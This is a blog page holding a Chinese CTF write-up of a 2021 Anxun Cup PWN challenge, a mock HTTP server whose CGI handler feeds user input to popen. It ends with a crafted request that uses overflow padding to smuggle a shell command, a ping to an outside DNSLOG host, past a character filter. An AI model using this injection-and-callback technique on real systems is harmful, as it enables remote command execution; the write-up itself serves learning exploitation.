@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021安洵杯Pwn2 WP">
+<meta property="og:url" content="http://yoursite.com/2021/12/14/Anxun4/index.html">
+<meta property="og:site_name" content="zzrR0">
+<meta property="og:description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/1.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/4.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/10.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/12.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/13.png">
+<meta property="og:image" content="http://yoursite.com/2021/12/14/Anxun4/14.png">
+<meta property="og:updated_time" content="2021-12-14T12:34:01.992Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2021安洵杯Pwn2 WP">
+<meta name="twitter:description" content="2021安洵杯线下赛 PWN2下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp 程序分析这题模拟了一个轻量的HTTP服务器main函数里首先会读取一个命令行参数,这个参数是一个目录然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1">
+<meta name="twitter:image" content="http://yoursite.com/2021/12/14/Anxun4/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/12/14/Anxun4/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>2021安洵杯Pwn2 WP | zzrR0</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zzrR0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/14/Anxun4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zzrR0">
+      <meta itemprop="description" content="Why am i so cai.">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzrR0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2021安洵杯Pwn2 WP
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-12-14 20:31:42 / 修改时间：20:34:01" itemprop="dateCreated datePublished" datetime="2021-12-14T20:31:42+08:00">2021-12-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/12/14/Anxun4/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/12/14/Anxun4/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/12/14/Anxun4/" class="leancloud_visitors" data-flag-title="2021安洵杯Pwn2 WP">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="2021安洵杯线下赛-PWN2"><a href="#2021安洵杯线下赛-PWN2" class="headerlink" title="2021安洵杯线下赛 PWN2"></a>2021安洵杯线下赛 PWN2</h1><p>下午的PWN2还挺real的，感觉是从哪个洞里改的？，这里写下wp</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这题模拟了一个轻量的HTTP服务器<br>main函数里首先会读取一个命令行参数,这个参数是一个目录<br>然后会gets读取下HTTP头，格式化字符串参数%[^ ] 是接受任意长度的字符串，这里就是接受按空格分割的三个字符串，就是HTTP请求头里面最开始的请求行GET /url.html HTTP/1.1</p>
+<p><img src="/2021/12/14/Anxun4/1.png" alt></p>
+<p>第二段是gets，得到请求头里面的请求头部，<br><img src="/2021/12/14/Anxun4/2.png" alt></p>
+<p>这里只对X-Forword-For进行处理，获取到值之后会拷贝到dest的最初的位置<br>这个值后面会有限定</p>
+<p>然后会比较请求方法必须为get方法</p>
+<p>第三段是对url路径进行过滤，基本上阻断了目录穿越<br><img src="/2021/12/14/Anxun4/3.png" alt><br>下面是解析url后面的参数,这种 index.html?username=root&amp;password=root</p>
+<p>第四段是对url进行判断，然后跳到对应的cgi函数进行处理(这里模拟的CGI)<br><img src="/2021/12/14/Anxun4/4.png" alt><br>总共是下面四个cgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">logctl.cgi  0x402994</span><br><span class="line">login.cgi   0x401E62</span><br><span class="line">logout.cgi  0x402396</span><br><span class="line">wifictl.cgi 0x40283E</span><br></pre></td></tr></table></figure></p>
+<p>其中最明显有洞的地方，就是在logctl.cgi中，有个popen的命令注入，也很符合实际的命令注入的模式<br><img src="/2021/12/14/Anxun4/5.png" alt></p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>字符串首先来源于传进来的url参数，再回头看param_parse的部分<br><img src="/2021/12/14/Anxun4/6.png" alt><br>这里逻辑是拆分key 和value，然后调用save_param保存参数<br><img src="/2021/12/14/Anxun4/7.png" alt><br>看save_param的逻辑，可以看到第i个参数的key会保存到dest[16<em>i + 32]，value会保存到dest[16</em>i + 40]的地方</p>
+<p>回到logctl.cgi<br><img src="/2021/12/14/Anxun4/8.png" alt><br>popen的参数command来源于wafStrng，WafString由sub_402CAC和block_check产生<br>block_check的第一个参数和第二个参数传的就是前面保存的key和value<br><img src="/2021/12/14/Anxun4/9.png" alt><br>block_check的逻辑是对输入的参数进行过滤，并且将参数里面包含的非法字符串保存到wafString中<br>“$;`’&amp;|&lt;&gt;^\n\r<br>因此这里得到的结论是命令注入的字符串无法可控。</p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>上面分析完，就觉得命令注入没法利用，因此我就看了其他逻辑，其中在main函数的后面<br><img src="/2021/12/14/Anxun4/10.png" alt><br>这里疑似存在一个任意文件读取的洞，但是url前面过滤死了，想了一会也绕不过去。<br>那基本上还剩的可疑的点就是strcpy的栈溢出了<br>在最开始接受URL的时候，长度设定了10000，非常大<br><img src="/2021/12/14/Anxun4/11.png" alt></p>
+<p>保存参数的时候也没有对长度进行限制，最终到检查非法字符时<br><img src="/2021/12/14/Anxun4/12.png" alt><br>这里存在栈溢出</p>
+<p>最开始想的是怎么利用栈溢出执行代码，可是程序开了NX，然后也没有好的地方可以泄露libc地址，<br><img src="/2021/12/14/Anxun4/13.png" alt><br><img src="/2021/12/14/Anxun4/14.png" alt><br>后来发现这个函数最后拷贝出非法字符串时用的v14刚好在s的上面，因此我们可以直接溢出到v14，然后后面拷贝v14的时候就拷贝的是我们的命令了</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这里我也没写利用脚本，直接给个构造的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/logctl.cgi?ring_token=1639212853:123&amp;username=;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;;ping+19d9fbde.dns.1433.eu.org; HTTP/1.1\n</span><br><span class="line">X-Forword-For: 192.168.1.20</span><br></pre></td></tr></table></figure></p>
+<p>这里执行的命令是ping DNSLOG，可以填上自己的命令</p>
+<p><a href="https://log.xn--9tr.com/" target="_blank" rel="noopener">https://log.xn--9tr.com/</a> DNSLog平台</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="zzrR0">
+            
+              <p class="site-author-name" itemprop="name">zzrR0</p>
+              <p class="site-description motion-element" itemprop="description">Why am i so cai.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2021安洵杯线下赛-PWN2"><span class="nav-number">1.</span> <span class="nav-text">2021安洵杯线下赛 PWN2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令注入"><span class="nav-number">1.2.</span> <span class="nav-text">命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">1.3.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.4.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzrR0</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2021/12/14/Anxun4/';
+        this.page.identifier = '2021/12/14/Anxun4/';
+        this.page.title = '2021安洵杯Pwn2 WP';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: '',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
